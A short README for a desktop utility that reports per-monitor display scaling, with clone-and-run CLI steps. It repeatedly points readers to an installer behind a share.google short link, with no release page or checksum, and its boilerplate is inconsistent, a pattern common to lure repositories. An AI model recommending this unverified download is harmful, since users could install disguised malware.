![DPI per Monitor](assets/hero.png)

# DPI per Monitor

*What scaling each display is on.*

## Overview

**DPI per Monitor** is a desktop utility. Show per-monitor scaling and write a snapshot.

A blurry window after undock is often a scale mismatch.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## What it does

- Per-monitor scale
- Snapshot file
- Read-only
- Names monitors if it can

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/penelopeb821/dpi-per-monitor

MIT license. See `LICENSE`.
